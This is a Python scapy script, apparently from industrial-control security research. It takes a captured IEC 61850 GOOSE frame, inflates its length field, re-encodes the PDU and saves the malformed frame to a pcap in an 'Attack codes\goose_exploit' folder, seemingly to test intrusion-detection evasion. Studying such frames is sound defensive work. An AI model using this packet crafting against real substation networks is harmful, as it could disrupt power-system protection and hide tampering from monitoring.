from gooseFunc import *
from scapy.all import *

GOOSE_TYPE = 0x88b8

# We have to tell script where to find the Goose module in parent directory

currentdir = os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
parentdir = os.path.dirname(currentdir)
sys.path.insert(0, parentdir)



packets = rdpcap('Attack codes\goose_exploit\ids_bust_boolean.pcapng')


mod_packet = packets[0]

# MODIFYING THE PACKET length

# EXTRACTING THE GOOSE HEADER (8 Bytes: APPID, Length, Reserved 1, Reserved 2)
mod_packet_load_start_goose = mod_packet.load[:8] 
# EXTRACTING THE allData PAYLOAD FROM THE END (6 bytes)
mod_packet_load_end_alldata = mod_packet.load[-6:]

# PARSE THE GOOSE PACKET FOR MODIFICATION
mod_data = GOOSE(mod_packet.load)
mod_pdu = mod_data[GOOSEPDU].original


print("Mod Data: ")
print(mod_data.length)
print(mod_data)
mod_data.show()
print(type(mod_data))
mod_data.length = len(mod_data) + 34
print(mod_data)
mod_data.show()
mod_pdu_decode = gooseAllData_decode(mod_pdu)
    
# mod_pdu_decode.setComponentByName('gocbRef', 'PDC02_11_700G_G1CFG/LLN0$GO$GooseDset_BF_P')
# mod_pdu_decode.setComponentByName('datSet', 'PDC02_11_700G_G1CFG/LLN0$Dset_BF_PDC02_11_700G_G1CFG/LLN0$Dset_BF')

# print("Mod PDU: ")
# print(mod_pdu_decode)


# ENCODED THE MODIFIED DATA (ASN.1/BER)
encoded_data = encoder.encode(mod_pdu_decode)
# mod_packet.load = mod_packet_load_start_goose + encoded_data
print(len(encoded_data))
# REBUILD THE MOD PACKET (GOOSE HEADER + MODIFIED PAYLOAD + REMAINING DATA STRUCTURE)
mod_packet.load = mod_packet_load_start_goose + encoded_data + mod_packet_load_end_alldata
    
print(len(mod_packet))



# print("\n\n" + "#"*30)
# print("Original Frame: ")
# print("#"*30)
# g_packets[0].show()

# print("\n\n" + "#"*30)
# print("Modified Frame:")
# print("#"*30)
# mod_packet.show()

f_name = 'Attack codes\goose_exploit\s1.pcapng'
wrpcap(f_name, mod_packet, append=True)

test_data = GOOSE(mod_packet.load)
test_data.show()
print(test_data.length)
